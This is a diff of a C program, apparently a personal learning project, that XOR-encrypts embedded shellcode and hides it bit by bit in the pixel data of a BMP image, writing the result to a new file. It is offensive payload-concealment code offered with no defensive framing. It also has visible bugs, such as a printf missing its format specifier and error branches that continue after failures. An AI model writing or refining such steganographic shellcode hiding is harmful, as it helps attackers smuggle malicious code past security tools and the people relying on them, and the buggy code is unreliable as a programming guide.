@@ -38,10 +38,10 @@ void XorEncryption(IN PBYTE pShellCode, IN SIZE_T sSizeOfShellCOde, IN PBYTE bKe
 	}
 }
 
-void WriteToLsbBmp(IN CONST PCHAR pBmpInput, IN CONST PCHAR pBmpOutput, IN PBYTE pXorShellCode, IN SIZE_T sSizeOfShellCode ){
+void WriteToLsbBmp(IN LPCSTR pBmpInput, IN LPCSTR pBmpOutput, IN PBYTE pXorShellCode, IN SIZE_T sSizeOfShellCode ){
 	//open bmp
-	PFILE pfin = fopen(pBmpInput, "rb" );
-	if(!pfin){
+	FILE *fin = fopen(pBmpInput, "rb" );
+	if(!fin){
 		printf("could not get bmp file \n");
 	}
 	
@@ -49,37 +49,77 @@ void WriteToLsbBmp(IN CONST PCHAR pBmpInput, IN CONST PCHAR pBmpOutput, IN PBYTE
 	fseek(fin, 0, SEEK_END);
 	SIZE_T sSizeOfBmpFile = ftell(fin);
 	rewind(fin);
+	printf("BMP opened size: %zu bytes\n", sSizeOfBmpFile);
 	
 	// put bmp in buffer
 	PBYTE pBmpBuffer = (PBYTE)malloc(sSizeOfBmpFile);
-	if(!BmpBuffer){
-		printf("unable to create a buffer/n");
+	if(!pBmpBuffer){
+		printf("unable to create a buffer\n");
 		fclose(fin);
 	}
 	
-	fread {pBmpBuffer, 1, sSizeOfBmpFile, fin);
+	fread (pBmpBuffer, 1, sSizeOfBmpFile, fin);
 	fclose(fin);
 	
 	//checking if we have enought bits 
 	
 	// at 10 = 54 so pPixel = 54 where d is store in bmp
-	PDWORD pPixelOffset = (PDWORD)(pBmpBuffer + 10);
-	printf("pixel data offset is: ", pPixelOffset);
+	DWORD dwPixelOffset = *(DWORD*)(pBmpBuffer + 10);
+	printf("pixel data offset is: ", dwPixelOffset);
 	
 	// 1 bit per pixels so each shellcode bytes needs 8 byte of bmp 
-	SIZE_T sBitsNeeded = sSizeOfShellCOde * 8;
-	SIZE_T sAvailableSize = sSizeOfBmpFile - pPixelOffset
+	SIZE_T sBitsNeeded = sSizeOfShellCode * 8;
+	SIZE_T sAvailableSize = sSizeOfBmpFile - dwPixelOffset;
+	printf("Pixel offset: %lu | Bits needed: %zu | Available: %zu\n", dwPixelOffset, sBitsNeeded, sAvailableSize);
+
 	
 	if(sBitsNeeded > sAvailableSize){
 		printf("file to small to fit shellcode");
+		free(pBmpBuffer);
 	}
 	
+	printf("Image can fit sc \n");
+	
+	// spent hrs researching bit and i hate it
+	// so there is no way to actaull read a bit in a byte cant go byte.bit[i] = 0
+	// need to shitft then &1 which is bascially 00000001 since this i only need the last 
+	
+	//embeding each bit of sc into lsb of bmp 
+	SIZE_T sBitIndex = 0;
+	
+	for(SIZE_T i = 0; i < sSizeOfShellCode; i++){
+		for(INT bit = 7; bit >= 0; bit--){
+			BYTE bExtractedBit =(pXorShellCode[i] >> bit) & 1;
+			// weird dump on 0xfe and & is changes the last bit which we wanna changes
+			//  0xfe is 1 1 1 1 1 1 1 0 which will keep the entire bit of the bmp intact and alaways set
+			// lsb to zero so we can or it to input our value
+			// super cool 
+			pBmpBuffer[dwPixelOffset + sBitIndex] = ( pBmpBuffer[dwPixelOffset + sBitIndex] & 0xFE ) | bExtractedBit;
+			
+			sBitIndex++;
+		}
+		
+	}
+	printf("Embedded %zu bits into BMP\n", sBitIndex);
+	
+	FILE* pFileOutput = fopen(pBmpOutput, "wb");
+	if(!pFileOutput){
+		printf("Unable to get output file \n");
+		free(pBmpBuffer);
+	}
+	
+	fwrite(pBmpBuffer, sSizeOfBmpFile, 1, pFileOutput);
+	fclose(pFileOutput);
+	printf("Output saved to: %s\n", pBmpOutput);
+	free(pBmpBuffer);
 }
-
+	
 
 int main(){
 	BYTE key[] = {0xBD};
 	XorEncryption(shellcode, sizeof(shellcode), key, sizeof(key));
+	
+	WriteToLsbBmp("snail.bmp", "sten.bmp", shellcode, sizeof(shellcode));
 	
 	printf("\n[-] ctrl + c to quit");
 	getchar();
